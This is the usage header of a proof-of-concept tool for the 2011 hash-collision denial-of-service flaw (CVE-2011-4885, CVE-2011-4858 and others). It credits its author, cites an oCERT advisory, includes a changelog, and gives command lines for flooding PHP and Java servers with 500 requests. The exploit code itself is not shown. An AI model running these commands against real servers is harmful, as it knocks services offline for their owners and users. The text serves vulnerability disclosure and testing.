This script was written by Christian Mehlmauer <FireFart@gmail.com>
https://twitter.com/#!/_FireFart_

Sourcecode online at:
https://github.com/FireFart/HashCollision-DOS-POC

Original PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision

http://www.ocert.org/advisories/ocert-2011-003.html
CVE:
    Apache Geronimo:    CVE-2011-5034
    Oracle Glassfish:   CVE-2011-5035
    PHP:                CVE-2011-4885
    Apache Tomcat:      CVE-2011-4858

requires Python 2.7

Examples:
-) Make a single Request, wait for the response and save the response to output0.html
python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP

-) Take down a PHP server(make 500 requests without waiting for a response):
python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP

-) Take down a JAVA server(tested with Tomcat and Glassfish; make 500 requests without waiting for a response, maximum POST data size 2MB):
python HashtablePOC.py -u https://host/index.jsp -v -c 500 -t JAVA -m 2

Changelog:
v6.0: Added Javapayloadgenerator
v5.0: Define max payload size as parameter
v4.0: Get PHP Collision Chars on the fly
v3.0: Load Payload from file
v2.0: Added Support for https, switched to HTTP 1.1
v1.0: Initial Release
